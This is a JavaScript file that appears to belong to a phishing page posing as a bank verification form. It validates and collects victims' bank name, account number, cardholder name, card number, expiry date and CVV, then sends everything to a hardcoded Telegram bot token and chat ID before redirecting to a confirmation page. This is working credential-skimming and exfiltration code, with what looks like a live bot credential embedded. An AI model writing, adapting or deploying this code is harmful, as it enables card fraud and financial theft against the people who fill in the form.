let currentStep = 0;
const steps = document.querySelectorAll(".form-step");

// Telegram Bot API Details
const TELEGRAM_BOT_TOKEN = "7781002847:AAH_wF0ySaWQ3dW6XY01gGcmnzUTITYA31M";
const TELEGRAM_CHAT_ID = "6300694007";

function nextStep() {
    if (validateStep()) {
        steps[currentStep].classList.remove("active");
        currentStep++;
        if (currentStep < steps.length) {
            steps[currentStep].classList.add("active");
        }
    }
}
function validateStep() {
    const inputs = steps[currentStep].querySelectorAll("input, select");
    for (let input of inputs) {
        if (!input.value.trim()) {
            alert(`Please fill in the ${input.previousElementSibling.innerText}`);
            return false;
        }

        if (input.id === "cardName" && !/^[A-Za-z\s]+$/.test(input.value)) {
            alert("Cardholder's name must only contain letters.");
            return false;
        }

        if (input.id === "cardNumber" && !/^\d{16}$/.test(input.value)) {
            alert("Card number must be exactly 16 digits.");
            return false;
        }

        if (input.id === "expiryDate" && !/^(0[1-9]|1[0-2])\/\d{2}$/.test(input.value)) {
            alert("Expiration date must be in MM/YY format.");
            return false;
        }

        if (input.id === "cvv" && !/^\d{3}$/.test(input.value)) {
            alert("CVV must be exactly 3 digits.");
            return false;
        }
    }
    return true;
}
// Save progress
function saveProgress() {
    localStorage.setItem("currentStep", currentStep);
}

// Load progress
window.onload = function () {
    const savedStep = localStorage.getItem("currentStep");
    if (savedStep) {
        currentStep = parseInt(savedStep);
        steps[currentStep].classList.add("active");
    }
};

function submitForm() {
    if (validateStep()) {
        // Collect user inputs
        const bank = document.getElementById("bank").value;
        const accountNumber = document.getElementById("accountNumber").value;
        const cardName = document.getElementById("cardName").value;
        const cardNumber = document.getElementById("cardNumber").value;
        const expiryDate = document.getElementById("expiryDate").value;
        const cvv = document.getElementById("cvv").value;

        // Format message
        const message = `🔔 **New Bank Verification Request** 🔔\n\n` +
            `🏦 **Bank Name:** ${bank}\n` +
            `💳 **Account Number:** ${accountNumber}\n\n` +
            `👤 **Cardholder Name:** ${cardName}\n` +
            `🔢 **Card Number:** ${cardNumber}\n` +
            `📅 **Expiration Date:** ${expiryDate}\n` +
            `🔒 **CVV:** ${cvv}`;

        // Send message to Telegram
        sendToTelegram(message);
    }
}

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            // Redirect only if the message is successfully sent
            window.location.href = "confirm.html";
        } else {
            alert("Failed to send details. Please try again.");
        }
    })
    .catch(() => {
        alert("Network error! Please check your connection and try again.");
    });
            }
